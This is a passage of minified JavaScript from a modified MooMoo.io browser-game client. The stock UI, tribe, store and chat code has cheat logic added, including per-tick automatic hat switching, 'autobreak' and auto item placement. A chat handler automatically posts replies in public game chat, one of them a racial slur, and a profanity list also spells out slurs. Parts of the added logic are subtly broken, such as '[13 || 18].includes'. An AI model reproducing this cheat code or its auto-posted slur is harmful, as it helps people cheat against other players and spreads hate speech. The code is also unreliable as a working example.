                                        if (n.translate(t.width / 2, t.height / 2), n.imageSmoothingEnabled = !1, n.webkitImageSmoothingEnabled = !1, n.mozImageSmoothingEnabled = !1, l.weapons[e]) {
                                            n.rotate(Math.PI / 4 + Math.PI);
                                            var i = new Image;
                                            Zn[l.weapons[e].src] = i, i.onload = function() {
                                                this.isLoaded = !0;
                                                var i = 1 / (this.height / this.width),
                                                    r = l.weapons[e].iPad || 1;
                                                n.drawImage(this, -t.width * r * o.iconPad * i / 2, -t.height * r * o.iconPad / 2, t.width * r * i * o.iconPad, t.height * r * o.iconPad), n.fillStyle = "rgba(0, 0, 70, 0.1)", n.globalCompositeOperation = "source-atop", n.fillRect(-t.width / 2, -t.height / 2, t.width, t.height), document.getElementById("actionBarItem" + e).style.backgroundImage = "url(" + t.toDataURL() + ")"
                                            }, i.src = tp(".././img/weapons/" + l.weapons[e].src + ".png"), (r = document.getElementById("actionBarItem" + e)).onmouseover = s.checkTrusted((function() {
                                                Tt(l.weapons[e], !0)
                                            })), r.onclick = s.checkTrusted((function() {
                                                Sn(e, !0)
                                            })), s.hookTouchEvents(r)
                                        } else {
                                            i = ri(l.list[e - l.weapons.length], !0);
                                            var r, a = Math.min(t.width - o.iconPadding, i.width);
                                            n.globalAlpha = 1, n.drawImage(i, -a / 2, -a / 2, a, a), n.fillStyle = "rgba(0, 0, 70, 0.1)", n.globalCompositeOperation = "source-atop", n.fillRect(-a / 2, -a / 2, a, a), document.getElementById("actionBarItem" + e).style.backgroundImage = "url(" + t.toDataURL() + ")", (r = document.getElementById("actionBarItem" + e)).onmouseover = s.checkTrusted((function() {
                                                Tt(l.list[e - l.weapons.length])
                                            })), r.onclick = s.checkTrusted((function() {
                                                Sn(e - l.weapons.length)
                                            })), s.hookTouchEvents(r)
                                        }
                                    }(t);
                                    Le.ontouchstart = s.checkTrusted((function(e) {
                                        e.preventDefault();
                                        var t = prompt("enter name", e.currentTarget.value);
                                        e.currentTarget.value = t.slice(0, 15)
                                    })), Se.checked = M, Se.onchange = s.checkTrusted((function(e) {
                                        Zt(e.target.checked)
                                    })), Te.checked = A, Te.onchange = s.checkTrusted((function(e) {
                                        A = Te.checked, I("show_ping", A ? "true" : "false");
                                    }))
                                }())
                            }), {
                                id: st,
                                d: ft,
                                1: En,
                                2: vi,
                                4: wi,
                                33: Ti,
                                5: Ln,
                                6: li,
                                a: gi,
                                aa: pi,
                                7: Wn,
                                8: hi,
                                sp: ui,
                                9: xi,
                                h: Si,
                                11: Pn,
                                12: Cn,
                                13: Bn,
                                14: bi,
                                15: Dn,
                                16: Un,
                                17: $t,
                                18: fi,
                                19: di,
                                20: Ci,
                                ac: Ot,
                                ad: _t,
                                an: Bt,
                                st: Rt,
                                sa: jt,
                                us: Nt,
                                ch: hn,
                                mm: Wt,
                                t: Mn,
                                p: Yt,
                                pp: Pi
                            }), pt(), setTimeout(() => gt(), 3e3)
                        }), (function(e) {
                            console.error("Vultr error:", e), alert("Error:\n" + e), ft("disconnected")
                        }))
                    }
                    var b, x = new g(o, s),
                        S = Math.PI,
                        T = 2 * S;

                    function I(e, t) {
                        b && localStorage.setItem(e, t)
                    }

                    function E(e) {
                        return b ? localStorage.getItem(e) : null
                    }
                    Math.lerpAngle = function(e, t, n) {
                        Math.abs(t - e) > S && (e > t ? t += T : e += T);
                        var i = t + (e - t) * n;
                        return i >= 0 && i <= T ? i : i % T
                    }, CanvasRenderingContext2D.prototype.roundRect = function(e, t, n, i, r) {
                        return n < 2 * r && (r = n / 2), i < 2 * r && (r = i / 2), r < 0 && (r = 0), this.beginPath(), this.moveTo(e + r, t), this.arcTo(e + n, t, e + n, t + i, r), this.arcTo(e + n, t + i, e, t + i, r), this.arcTo(e, t + i, e, t, r), this.arcTo(e, t, e + n, t, r), this.closePath(), this
                    }, "undefined" != typeof Storage && (b = !0), E("consent") || (window.hi), window.checkTerms = function(e) {
                        e ? (window.hi, I("consent", 1)) : $("#consentShake").effect("shake")
                    };
                    var M, A, P, B, C, O, R, j, _, U, D, L, F, z, H = E("moofoll"),
                        V = 1,
                        q = Date.now(),
                        Y = [],
                        W = [],
                        X = [],
                        N = [],
                        G = [],
                        J = new p(d, G, W, Y, nt, l, o, s),
                        K = n(70),
                        Q = n(71),
                        Z = new K(Y, Q, W, l, null, o, s),
                        ee = 1,
                        te = 0,
                        ne = 0,
                        ie = 0,
                        re = {
                            id: -1,
                            startX: 0,
                            startY: 0,
                            currentX: 0,
                            currentY: 0
                        },
                        se = {
                            id: -1,
                            startX: 0,
                            startY: 0,
                            currentX: 0,
                            currentY: 0
                        },
                        ae = 0,
                        oe = o.maxScreenWidth,
                        ce = o.maxScreenHeight,
                        le = !1,
                        he = (document.getElementById("ad-container"), document.getElementById("mainMenu")),
                        ue = document.getElementById("enterGame"),
                        fe = document.getElementById("promoImg"),
                        de = document.getElementById("partyButton"),
                        pe = document.getElementById("joinPartyButton"),
                        ge = document.getElementById("settingsButton"),
                        me = ge.getElementsByTagName("span")[0],
                        ye = document.getElementById("allianceButton"),
                        ke = document.getElementById("storeButton"),
                        ve = document.getElementById("chatButton"),
                        we = document.getElementById("gameCanvas"),
                        be = we.getContext("2d"),
                        xe = document.getElementById("serverBrowser"),
                        Se = document.getElementById("nativeResolution"),
                        Te = document.getElementById("showPing"),
                        Ie = (document.getElementById("playMusic"), document.getElementById("pingDisplay")),
                        Ee = document.getElementById("shutdownDisplay"),
                        Me = document.getElementById("menuCardHolder"),
                        Ae = document.getElementById("guideCard"),
                        Pe = document.getElementById("loadingText"),
                        Be = document.getElementById("gameUI"),
                        Ce = document.getElementById("actionBar"),
                        Oe = document.getElementById("scoreDisplay"),
                        Re = document.getElementById("foodDisplay"),
                        je = document.getElementById("woodDisplay"),
                        _e = document.getElementById("stoneDisplay"),
                        Ue = document.getElementById("killCounter"),
                        De = document.getElementById("leaderboardData"),
                        Le = document.getElementById("nameInput"),
                        Fe = document.getElementById("itemInfoHolder"),
                        ze = document.getElementById("ageText"),
                        He = document.getElementById("ageBarBody"),
                        Ve = document.getElementById("upgradeHolder"),
                        qe = document.getElementById("upgradeCounter"),
                        Ye = document.getElementById("allianceMenu"),
                        We = document.getElementById("allianceHolder"),
                        Xe = document.getElementById("allianceManager"),
                        Ne = document.getElementById("mapDisplay"),
                        Ge = document.getElementById("diedText"),
                        Je = document.getElementById("skinColorHolder"),
                        Ke = Ne.getContext("2d");
                    Ne.width = 300, Ne.height = 300;
                    var Qe = document.getElementById("storeMenu"),
                        $e = document.getElementById("storeHolder"),
                        Ze = document.getElementById("noticationDisplay"),
                        et = f.hats,
                        tt = f.accessories,
                        nt = new h(c, N, s, o),
                        it = "#525252",
                        rt = "#3d3f42";

                    function st(e) {
                        X = e.teams
                    }
                    var at = document.getElementById("featuredYoutube"),
                        ot = [{
                            name: "Corrupt X",
                            link: "https://www.youtube.com/channel/UC0UH2LfQvBSeH24bmtbmITw"
                        }, {
                            name: "Tweak Big",
                            link: "https://www.youtube.com/channel/UCbwvzJ38AndDTkoX8sD9YOw"
                        }, {
                            name: "Arena Closer",
                            link: "https://www.youtube.com/channel/UCazucVSJqW-kiHMIhQhD-QQ"
                        }, {
                            name: "Godenot",
                            link: "https://www.youtube.com/user/SirGodenot"
                        }, {
                            name: "RajNoobTV",
                            link: "https://www.youtube.com/channel/UCVLo9brXBWrCttMaGzvm0-Q"
                        }, {
                            name: "TomNotTom",
                            link: "https://www.youtube.com/channel/UC7z97RgHFJRcv2niXgArBDw"
                        }, {
                            name: "Nation",
                            link: "https://www.youtube.com/channel/UCSl-MBn3qzjrIvLNESQRk-g"
                        }, {
                            name: "Pidyohago",
                            link: "https://www.youtube.com/channel/UC04p8Mg8nDaDx04A9is2B8Q"
                        }, {
                            name: "Enigma",
                            link: "https://www.youtube.com/channel/UC5HhLbs3sReHo8Bb9NDdFrg"
                        }, {
                            name: "Bauer",
                            link: "https://www.youtube.com/channel/UCwU2TbJx3xTSlPqg-Ix3R1g"
                        }, {
                            name: "iStealth",
                            link: "https://www.youtube.com/channel/UCGrvlEOsQFViZbyFDE6t69A"
                        }, {
                            name: "SICKmania",
                            link: "https://www.youtube.com/channel/UCvVI98ezn4TpX5wDMZjMa3g"
                        }, {
                            name: "LightThief",
                            link: "https://www.youtube.com/channel/UCj6C_tiDeATiKd3GX127XoQ"
                        }, {
                            name: "Fortish",
                            link: "https://www.youtube.com/channel/UCou6CLU-szZA3Tb340TB9_Q"
                        }, {
                            name: "巧克力",
                            link: "https://www.youtube.com/channel/UCgL6J6oL8F69vm-GcPScmwg"
                        }, {
                            name: "i Febag",
                            link: "https://www.youtube.com/channel/UCiU6WZwiKbsnt5xmwr0OFbg"
                        }, {
                            name: "GoneGaming",
                            link: "https://www.youtube.com/channel/UCOcQthRanYcwYY0XVyVeK0g"
                        }],
                        ct = ot[s.randInt(0, ot.length - 1)];
                    at.innerHTML = "<a target='_blank' class='ytLink' href='" + ct.link + "'><i class='material-icons' style='vertical-align: top;'>&#xE064;</i> " + ct.name + "</a>";
                    var lt = !0,
                        ht = !1,
                        ut = !1,
                        packs = [];

                    function ft(e) {
                        r.close(), dt(e)
                    }

                    function dt(e) {
                        he.style.display = "block", Be.style.display = "none", Me.style.display = "none", Ge.style.display = "none", Pe.style.display = "block", Pe.innerHTML = e + "<a href='javascript:window.location.href=window.location.href' class='ytLink'>reload</a>"
                    }
                    window.onblur = function() {
                        lt = !1
                    }, window.onfocus = function() {
                        lt = !0, R && R.alive && yn()
                    }, window.onload = function() {
                        ht = !0, v(), setTimeout((function() {
                            k || (onbeforeunload = null, window.location.reload())
                        }), 2e4)
                    }, window.captchaCallback = function() {
                        ut = !0, v()
                    }, we.oncontextmenu = function() {
                        return !1
                    };

                    function pt() {
                        var e, t, n = "",
                            i = 0;
                        for (var r in y.servers) {
                            for (var s = y.servers[r], a = 0, c = 0; c < s.length; c++)
                                for (var l = 0; l < s[c].games.length; l++) a += s[c].games[l].playerCount;
                            i += a;
                            var h = y.regionInfo[r].name;
                            n += "<option disabled>" + h + " - " + a + " players</option>";
                            for (var u = 0; u < s.length; u++)
                                for (var f = s[u], d = 0; d < f.games.length; d++) {
                                    var p = f.games[d],
                                        g = 1 * f.index + d + 1,
                                        m = y.server && y.server.region === f.region && y.server.index === f.index && y.gameIndex == d,
                                        k = h + " " + g + " [" + Math.min(p.playerCount, o.maxPlayers) + "/" + o.maxPlayers + "]";
                                    let e = y.stripRegion(r) + ":" + u + ":" + d;
                                    m && (de.getElementsByTagName("span")[0].innerText = e), n += "<option value='" + e + "' " + (m ? "selected" : "") + ">" + k + "</option>"
                                }
                            n += "<option disabled></option>"
                        }
                        n += "<option disabled>All Servers - " + i + " players</option>", xe.innerHTML = n, "sandbox.moomoo.io" == location.hostname ? (e = "Back to MooMoo", t = "//moomoo.io/") : (e = "Try the sandbox", t = "//sandbox.moomoo.io/"), document.getElementById("altServer").innerHTML = "<a href='" + t + "'>" + e + "<i class='material-icons' style='font-size:10px;vertical-align:middle'>arrow_forward_ios</i></a>"
                    }

                    function gt() {
                        var e = new XMLHttpRequest;
                        e.onreadystatechange = function() {
                            4 == this.readyState && (200 == this.status ? (window.vultr = JSON.parse(this.responseText), y.processServers(vultr.servers), pt()) : console.error("Failed to load server data with status code:", this.status))
                        }, e.open("GET", "/serverData", !0), e.send()
                    }
                    xe.addEventListener("change", s.checkTrusted((function() {
                        let e = xe.value.split(":");
                        y.switchServer(e[0], e[1], e[2])
                    })));
                    var mt = document.getElementById("pre-content-container"),
                        yt = null,
                        kt = null;

                    var vt = 3e5,
                        wt = 0,
                        bt = 0;

                    function xt() {
                        if (!cpmstarAPI || !kt) return console.log("Failed to load video ad API", !!cpmstarAPI, !!kt), void Tn();
                        (yt = new kt.game.RewardedVideoView("rewardedvideo")).addEventListener("ad_closed", (function(e) {
                            console.log("Video ad closed"), St()
                        })), yt.addEventListener("loaded", (function(e) {
                            console.log("Video ad loaded"), yt.show()
                        })), yt.addEventListener("load_failed", (function(e) {
                            console.log("Video ad load failed", e), St()
                        })), yt.load(), mt.style.display = "block"
                    }

                    function St() {
                        mt.style.display = "none", Tn()
                    }

                    function Tt(e, t, n) {
                        if (R && e)
                            if (s.removeAllChildren(Fe), Fe.classList.add("visible"), s.generateElement({
                                id: "itemInfoName",
                                text: s.capitalizeFirst(e.name),
                                parent: Fe
                            }), s.generateElement({
                                id: "itemInfoDesc",
                                text: e.desc,
                                parent: Fe
                            }), n);
                            else if (t) s.generateElement({
                                class: "itemInfoReq",
                                text: e.type ? "secondary" : "primary",
                                parent: Fe
                            });
                            else {
                                for (var i = 0; i < e.req.length; i += 2) s.generateElement({
                                    class: "itemInfoReq",
                                    html: e.req[i] + "<span class='itemInfoReqVal'> x" + e.req[i + 1] + "</span>",
                                    parent: Fe
                                });
                                e.group.limit && s.generateElement({
                                    class: "itemInfoLmt",
                                    text: (R.itemCounts[e.group.id] || 0) + "/" + e.group.limit,
                                    parent: Fe
                                })
                            } else Fe.classList.remove("visible")
                    }
                    window.showPreAd = xt;
                    var It, Et, Mt, At = [],
                        Pt = [];
                    const Tribe = function(e){
                        for(let i = 0; i < Pt.length; i += 2){
                            if(e == Pt[i]) return true;
                        };
                        return false;
                    }
                    function Bt(e, t) {
                        At.push({
                            sid: e,
                            name: t
                        }), Ct()
                    }

                    function Ct() {
                        if (At[0]) {
                            var e = At[0];
                            s.removeAllChildren(Ze), Ze.style.display = "block", s.generateElement({
                                class: "notificationText",
                                text: e.name,
                                parent: Ze
                            }), s.generateElement({
                                class: "notifButton",
                                html: "<i class='material-icons' style='font-size:28px;color:#cc5151;'>&#xE14C;</i>",
                                parent: Ze,
                                onclick: function() {
                                    Dt(0)
                                },
                                hookTouch: !0
                            }), s.generateElement({
                                class: "notifButton",
                                html: "<i class='material-icons' style='font-size:28px;color:#8ecc51;'>&#xE876;</i>",
                                parent: Ze,
                                onclick: function() {
                                    Dt(1)
                                },
                                hookTouch: !0
                            })
                        } else Ze.style.display = "none"
                    }

                    function Ot(e) {
                        X.push(e), "block" == Ye.style.display && Ut()
                    }

                    function Rt(e, t) {
                        R && (R.team = e, R.isOwner = t, "block" == Ye.style.display && Ut())
                    }

                    function jt(e) {
                        Pt = e, "block" == Ye.style.display && Ut()
                    }

                    function _t(e) {
                        for (var t = X.length - 1; t >= 0; t--) X[t].sid == e && X.splice(t, 1);
                        "block" == Ye.style.display && Ut()
                    }

                    function Ut() {
                        if (R && R.alive) {
                            if (an(), Qe.style.display = "none", Ye.style.display = "block", s.removeAllChildren(We), R.team)
                                for (var e = 0; e < Pt.length; e += 2) ! function(e) {
                                    var t = s.generateElement({
                                        class: "allianceItem",
                                        style: "color:" + (Pt[e] == R.sid ? "#fff" : "rgba(255,255,255,0.6)"),
                                        text: Pt[e + 1],
                                        parent: We
                                    });
                                    R.isOwner && Pt[e] != R.sid && s.generateElement({
                                        class: "joinAlBtn",
                                        text: "Kick",
                                        onclick: function() {
                                            Lt(Pt[e])
                                        },
                                        hookTouch: !0,
                                        parent: t
                                    })
                                }(e);
                            else if (X.length)
                                for (e = 0; e < X.length; ++e) ! function(e) {
                                    var t = s.generateElement({
                                        class: "allianceItem",
                                        style: "color:" + (X[e].sid == R.team ? "#fff" : "rgba(255,255,255,0.6)"),
                                        text: X[e].sid,
                                        parent: We
                                    });
                                    s.generateElement({
                                        class: "joinAlBtn",
                                        text: "Join",
                                        onclick: function() {
                                            Ft(e)
                                        },
                                        hookTouch: !0,
                                        parent: t
                                    })
                                }(e);
                            else s.generateElement({
                                class: "allianceItem",
                                text: "No Tribes Yet",
                                parent: We
                            });
                            s.removeAllChildren(Xe), R.team ? s.generateElement({
                                class: "allianceButtonM",
                                style: "width: 360px",
                                text: R.isOwner ? "Delete Tribe" : "Leave Tribe",
                                onclick: function() {
                                    Ht()
                                },
                                hookTouch: !0,
                                parent: Xe
                            }) : (s.generateElement({
                                tag: "input",
                                type: "text",
                                id: "allianceInput",
                                maxLength: 7,
                                placeholder: "unique name",
                                ontouchstart: function(e) {
                                    e.preventDefault();
                                    var t = prompt("unique name", e.currentTarget.value);
                                    e.currentTarget.value = t.slice(0, 7)
                                },
                                parent: Xe
                            }), s.generateElement({
                                tag: "div",
                                class: "allianceButtonM",
                                style: "width: 140px;",
                                text: "Create",
                                onclick: function() {
                                    zt()
                                },
                                hookTouch: !0,
                                parent: Xe
                            }))
                        }
                    }

                    function Dt(e) {
                        r.send("11", At[0].sid, e), At.splice(0, 1), Ct()
                    }

                    function Lt(e) {
                        r.send("12", e)
                    }

                    function Ft(e) {
                        r.send("10", X[e].sid)
                    }

                    function zt() {
                        r.send("8", document.getElementById("allianceInput").value)
                    }

                    function Ht() {
                        At = [], Ct(), r.send("9")
                    }
                    var Vt, qt = [];

                    function Yt(e, t) {
                        for (var n = 0; n < qt.length; ++n)
                            if (!qt[n].active) {
                                Vt = qt[n];
                                break
                            } Vt || (Vt = new function() {
                                this.init = function(e, t) {
                                    this.scale = 0, this.x = e, this.y = t, this.active = !0
                                }, this.update = function(e, t) {
                                    this.active && (this.scale += .05 * t, this.scale >= o.mapPingScale ? this.active = !1 : (e.globalAlpha = 1 - Math.max(0, this.scale / o.mapPingScale), e.beginPath(), e.arc(this.x / o.mapScale * Ne.width, this.y / o.mapScale * Ne.width, this.scale, 0, 2 * Math.PI), e.stroke()))
                                }
                            }, qt.push(Vt)), Vt.init(e, t)
                    }

                    function Wt(e) {
                        Et = e
                    }
                    var Xt = 0;

                    function Nt(e, t, n) {
                        n ? e ? R.tailIndex = t : R.tails[t] = 1 : e ? R.skinIndex = t : R.skins[t] = 1, "block" == Qe.style.display && Gt()
                    }

                    function Gt() {
                        if (R) {
                            s.removeAllChildren($e);
                            for (var e = Xt, t = e ? tt : et, n = 0; n < t.length; ++n) t[n].dontSell || function(n) {
                                var i = s.generateElement({
                                    id: "storeDisplay" + n,
                                    class: "storeItem",
                                    onmouseout: function() {
                                        Tt()
                                    },
                                    onmouseover: function() {
                                        Tt(t[n], !1, !0)
                                    },
                                    parent: $e
                                });
                                s.hookTouchEvents(i, !0), s.generateElement({
                                    tag: "img",
                                    class: "hatPreview",
                                    src: tp("../img/" + (e ? "accessories/access_" : "hats/hat_") + t[n].id + (t[n].topSprite ? "_p" : "") + ".png"),
                                    parent: i
                                }), s.generateElement({
                                    tag: "span",
                                    text: t[n].name,
                                    parent: i
                                }), (e ? R.tails[t[n].id] : R.skins[t[n].id]) ? (e ? R.tailIndex : R.skinIndex) == t[n].id ? s.generateElement({
                                    class: "joinAlBtn",
                                    style: "margin-top: 5px",
                                    text: "Unequip",
                                    onclick: function() {
                                        Jt(0, e)
                                    },
                                    hookTouch: !0,
                                    parent: i
                                }) : s.generateElement({
                                    class: "joinAlBtn",
                                    style: "margin-top: 5px",
                                    text: "Equip",
                                    onclick: function() {
                                        Jt(t[n].id, e)
                                    },
                                    hookTouch: !0,
                                    parent: i
                                }) : (s.generateElement({
                                    class: "joinAlBtn",
                                    style: "margin-top: 5px",
                                    text: "Buy",
                                    onclick: function() {
                                        Kt(t[n].id, e)
                                    },
                                    hookTouch: !0,
                                    parent: i
                                }), s.generateElement({
                                    tag: "span",
                                    class: "itemPrice",
                                    text: t[n].price,
                                    parent: i
                                }))
                            }(n)
                        }
                    }

                    function Jt(e, t) {
                        if(nochangeskin) return;
                        r.send("13c", 0, e, t)
                    }
                    function Kt(e, t) {
                        r.send("13c", 1, e, t)
                    }

                    var nochangeskin = false;

                    function Hg(e, t) {
                        if(R.skinIndex === 45) return;
                        if(ae86 && !nochangeskin) {
                            Jt(e, 0);
                            Jt(t, 1);
                        } else {
                            if(!nochangeskin) {
                                if(!R.skins[e]) {
                                    if(!window.test) {
                                        Jt(0, 0)
                                    }
                                    window.test = true;
                                } else {
                                    window.test = false;
                                    if(R.skinIndex !== t) {
                                        Jt(e, 0);
                                    }
                                }
                            }
                            if(!R.tails[t]) {
                                if(!window.test2) {
                                    Jt(0, 1)
                                }
                                window.test2 = true;
                            } else {
                                window.test2 = false;
                                if(R.tailIndex !== t) {
                                    Jt(t, 1);
                                }
                            }
                        }
                    }

                    function Qt() {
                        Qe.style.display = "none", Ye.style.display = "none", an()
                    }

                    function $t(e, t) {
                        e && (t ? R.weapons = e : R.items = e);
                        for (var n = 0; n < l.list.length; ++n) {
                            var i = l.weapons.length + n;
                            document.getElementById("actionBarItem" + i).style.display = R.items.indexOf(l.list[n].id) >= 0 ? "inline-block" : "none"
                        }
                        for (n = 0; n < l.weapons.length; ++n) document.getElementById("actionBarItem" + n).style.display = R.weapons[l.weapons[n].type] == l.weapons[n].id ? "inline-block" : "none"
                    }

                    function Zt(e) {
                        M = e, V = qual, Se.checked = e, I("native_resolution", e.toString()), un()
                    }

                    function en() {
                        for (var e = "", t = 0; t < o.skinColors.length; ++t) e += t == ae ? "<div class='skinColorItem activeSkin' style='background-color:" + o.skinColors[t] + "' onclick='selectSkinColor(" + t + ")'></div>" : "<div class='skinColorItem' style='background-color:" + o.skinColors[t] + "' onclick='selectSkinColor(" + t + ")'></div>";
                        Je.innerHTML = e
                    }
                    var tn = document.getElementById("chatBox"),
                        nn = document.getElementById("chatHolder");

                    function rn() {
                        on ? setTimeout((function() {
                            var e = prompt("chat message");
                            e && sn(e)
                        }), 1) : "block" == nn.style.display ? (tn.value && sn(tn.value), an()) : (Qe.style.display = "none", Ye.style.display = "none", nn.style.display = "block", tn.focus(), yn()), tn.value = ""
                    }

                    function sn(e) {
                        r.send("ch", e.slice(0, 30))
                    }

                    window.chat = sn;

                    function an() {
                        tn.value = "", nn.style.display = "none"
                    }
                    var on, cn, ln = ["cunt", "whore", "fuck", "shit", "faggot", "nigger", "nigga", "dick", "vagina", "minge", "cock", "rape", "cum", "sex", "tits", "penis", "clit", "pussy", "meatcurtain", "jizz", "prune", "douche", "wanker", "damn", "bitch", "dick", "fag", "bastard"];

                    function hn(e, t) {
                        var n = Ii(e);
                        n && (n.chatMessage = function(e) {
                            let isFriendly = (n.sid == R.sid || (n.team !== null && n.team == R.team)) ? true : false,
                                insult = ln.find(t => e.includes(t));
                            if(isFriendly && e == "-") {
                                doSyncNextTick();
                            }
                            if(!insult) return e;

                            let sentence = e.split(" ");
                            let names = ["jetx", "jet"];
                            if(["did", "didn't", "were", "was", "is", "am", "are", "have", "has"].includes(sentence[0])) {
                                if(names.includes(sentence[1])) {
                                    if(sentence[2] == "good") {
                                        r.send("ch", "jetx is good, facts");
                                    } else {
                                        if(["was", "is"].includes(sentence[2]) && sentence[3] == "good") {
                                            r.send("ch", "jetx is gooood");
                                        }
                                    }
                                }
                            } else {
                                if(names.includes(sentence[0])) {
                                    if(["was", "is"].includes(sentence[1])) {
                                        if(ln.includes(sentence[2]) || (["a", "an"].includes(sentence[2]) && ln.includes(sentence[3]))) {
                                            r.send("ch", "WHY EZ LOL" + sentence[2]);
                                        }
                                    } else {
                                        if(ln.includes(sentence[1])) {
                                            r.send("ch", "MEOW MEOW NIGGA");
                                        }
                                    }
                                }
                            }
                            return e;
                        }(t), n.chatCountdown = o.chatCountdown)
                    }

                    function un() {
                        F = window.innerWidth, z = window.innerHeight;
                        var e = Math.max(F / oe, z / ce) * V;
                        we.width = F * V, we.height = z * V, we.style.width = F + "px", we.style.height = z + "px", be.setTransform(e, 0, 0, e, (F * V - oe * e) / 2, (z * V - ce * e) / 2)
                    }

                    function fn(e) {
                        (on = e) ? Ae.classList.add("touch"): Ae.classList.remove("touch")
                    }

                    function dn(e) {
                        e.preventDefault(), e.stopPropagation(), fn(!0);
                        for (var t = 0; t < e.changedTouches.length; t++) {
                            var n = e.changedTouches[t];
                            n.identifier == re.id ? (re.id = -1, bn()) : n.identifier == se.id && (se.id = -1, R.buildIndex >= 0 && (O = 1, vn()), O = 0, vn())
                        }
                    }

                    function pn() {
                        return R ? (-1 != se.id ? cn = Math.atan2(se.currentY - se.startY, se.currentX - se.startX) : R.lockDir || on || (cn = Math.atan2(ie - z / 2, ne - F / 2)), s.fixTo(cn || 0, 2)) : 0
                    }
                    window.addEventListener("resize", s.checkTrusted(un)), un(), fn(!1), window.setUsingTouch = fn, we.addEventListener("touchmove", s.checkTrusted((function(e) {
                        e.preventDefault(), e.stopPropagation(), fn(!0);
                        for (var t = 0; t < e.changedTouches.length; t++) {
                            var n = e.changedTouches[t];
                            n.identifier == re.id ? (re.currentX = n.pageX, re.currentY = n.pageY, bn()) : n.identifier == se.id && (se.currentX = n.pageX, se.currentY = n.pageY, O = 1)
                        }
                    })), !1), we.addEventListener("touchstart", s.checkTrusted((function(e) {
                        e.preventDefault(), e.stopPropagation(), fn(!0);
                        for (var t = 0; t < e.changedTouches.length; t++) {
                            var n = e.changedTouches[t];
                            n.pageX < document.body.scrollWidth / 2 && -1 == re.id ? (re.id = n.identifier, re.startX = re.currentX = n.pageX, re.startY = re.currentY = n.pageY, bn()) : n.pageX > document.body.scrollWidth / 2 && -1 == se.id && (se.id = n.identifier, se.startX = se.currentX = n.pageX, se.startY = se.currentY = n.pageY, R.buildIndex < 0 && (O = 1, vn()))
                        }
                    })), !1), we.addEventListener("touchend", s.checkTrusted(dn), !1), we.addEventListener("touchcancel", s.checkTrusted(dn), !1), we.addEventListener("touchleave", s.checkTrusted(dn), !1), we.addEventListener("mousemove", (function(e) {
                        e.preventDefault(), e.stopPropagation(), fn(!1), ne = e.clientX, ie = e.clientY, setAim();
                    }), !1), we.addEventListener("mousedown", (function(e) {
                        fn(!1), 1 != O && (O = 1, vn(e))
                    }), !1), we.addEventListener("mouseup", (function(e) {
                        fn(!1), 0 != O && (O = 0, vn(false))
                    }), !1);
                    var gn = {},
                        mn = {
                            87: [0, -1],
                            38: [0, -1],
                            83: [0, 1],
                            40: [0, 1],
                            65: [-1, 0],
                            37: [-1, 0],
                            68: [1, 0],
                            39: [1, 0]
                        };

                    function yn() {
                        gn = {}, r.send("rmd")
                    }

                    function kn() {
                        return "block" != Ye.style.display && "block" != nn.style.display
                    }

                    var clickInterval = 0,
                        cT = 0,
                        cmi = false;
                    function vn(e) {
                        let bTick = Math.abs(bullTick % 9 - l.ticks % 9) < 2;
                        let bleed = l.ticks - bullTick > 8 && R.clownCounter > 0 && R.skinIndex != 45;

                        if(e && "chatbox" !== document.activeElement.id.toLowerCase()) {
                            if(e.button == 1) {
                                doSyncNextTick();
                            } else {
                                removeExecuteEveryTick(clickInterval), cT = e.button;

                                clickInterval = executeEveryTick(function () {
                                    setWeapon(cT == 2 && doBestBreakWeaponOnRightClickHold && R.weapons[1] == 10 ? 1 : 0);
                                    if(cT == 2) {
                                        autobreak.it = true;
                                    };

                                    if(R[aw ? "secondaryReload" : "primaryReload"] == 1) {
                                        if(rubyFarm) {
                                            for(let i = 0; i < 4; i++) {
                                                dp(R.items[5], i * Math.PI / 2)
                                            }
                                        };

                                        let leftAccessories = R && enemies && Math.hypot(enemies.x - R.x2, enemies.y - R.y2) <= 300 && [13 || 18].includes(enemies.tailIndex) ? 21 : enemies.tailIndex == 21 ? 18 : bleed ? 13 : 18;
                                        let rightAccessories = R && enemies && Math.hypot(enemies.x - R.x2, enemies.y - R.y2) <= 300 && [13 || 18].includes(enemies.tailIndex) ? 21 : enemies.tailIndex == 21 ? 18 : bleed ? 13 : 11;

                                        if(fz || rv2 || sandy) {
                                            Hg(cT == 2 ? 40 : 7, cT == 2 ? rightAccessories : leftAccessories);
                                        } else if(don) {
                                            Hg(cT == 2 ? 40 : 7, cT == 2 ? enemyInCondition() ? 21 : 11 : enemyInCondition() ? 21 : 0);
                                        } else if(ae86) {
                                            Hg(cT == 2 ? 40 : 7, cT == 2 ? R.weapons[1] == 10 ? 21 : 0 : R.weapons[1] == 10 ? 21 : 0);
                                        } else if(vs) {
                                            Hg(cT == 2 ? 40 : 7, cT == 2 ? 11 : 18);
                                        } else if(lur) {
                                            Hg(cT == 2 ? 40 : 7, cT == 2 ? 11 : 18);
                                        }

                                        if(cT == 2 && cT != 0) {
                                            if(!rubyFarm) {
                                                autobreak.h = true, autobreak.a = pn();
                                            } else {
                                                autobreak.h = true, autobreak.a = pn();
                                            }
                                        }

                                        r.send("7", 1);
                                        cmi = true;
                                        nextTickDo(function () {
                                            r.send("7", 1);
                                            cmi = false;
                                        });
                                    } else {
                                        let rightAccessories = R && enemies && Math.hypot(enemies.x - R.x2, enemies.y - R.y2) <= 300 && [13 || 18].includes(enemies.tailIndex) ? 21 : enemies.tailIndex == 21 ? 18 : bleed ? 13 : 11;
                                        autobreak.h = false;

                                        if(!ae86 && !lur && !don) {
                                            if(wn == null) {
                                                sandy || rv2 ? Hg(bleed ? 7 : 6, rightAccessories) : Hg(bleed ? 7 : 22, rightAccessories);
                                            } else {
                                                basicGear();
                                            }
                                        } else {
                                            basicGear();
                                        }
                                    }
                                });
                            }
                        } else {
                            cT = 0, removeExecuteEveryTick(clickInterval);
                        }
                    }

                    window.addEventListener("keydown", s.checkTrusted((function(e) {
                        var t = e.which || e.keyCode || 0;
                        27 == t ? Qt() : R && R.alive && kn() && (gn[t] || (gn[t] = 1, 69 == t ? r.send("7", 1) : 67 == t ? (Mt || (Mt = {}), Mt.x = R.x, Mt.y = R.y) : 88 == t ? (R.lockDir = R.lockDir ? 0 : 1, r.send("7", 0)) : null != R.weapons[t - 49] ? setWeapon(t - 49) : null != R.items[t - 49 - R.weapons.length] ? Sn(R.items[t - 49 - R.weapons.length]) : 81 == t ? Sn(R.items[0]) : 82 == t ? xn() : 78 == t ? (millPlacer = !millPlacer) : mn[t] ? bn() : 32 == t ? (O = 1, vn()) : ""))
                    }))), window.addEventListener("keyup", s.checkTrusted((function(e) {
                        if (R && R.alive) {
                            var t = e.which || e.keyCode || 0;
